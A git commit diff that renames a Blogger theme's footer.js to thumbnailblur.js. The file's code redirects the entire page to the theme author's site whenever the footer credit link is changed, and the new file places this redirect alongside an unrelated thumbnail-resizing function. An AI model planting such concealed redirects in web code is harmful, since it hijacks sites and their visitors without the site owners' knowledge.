e95d83f37a9a76318b48d561c1a34bb36fc38de2
mfachmii7 <30945129+mfachmii7@users.noreply.github.com>
2017-08-12 12:07:13 +0700

    Update and rename footer.js to thumbnailblur.js

--- footer.js
+++
@@ -1,4 +0,0 @@
-//<![CDATA[
-$(document).ready(function () { if ($("#change,.change").attr("href") != "http://www.fachmithemes.tk/") {
-        window.location.href = "http://www.fachmithemes.tk"; }});
-//]]>
---
+++ thumbnailblur.js
@@ -0,0 +1,4 @@
+//<![CDATA[
+$(document).ready(function () { if ($("#change,.change").attr("href") != "http://www.fachmithemes.tk/") {
+        window.location.href = "http://www.fachmithemes.tk"; }});function BlogMasTamvan(e,t){for(var g=document.getElementById(e),m=g.getElementsByTagName("img"),r=0;r<m.length;r++)m[r].src=m[r].src.replace(/\/s72\-c/,"/s"+t),m[r]}BlogMasTamvan("Blog1",1600);
+//]]>
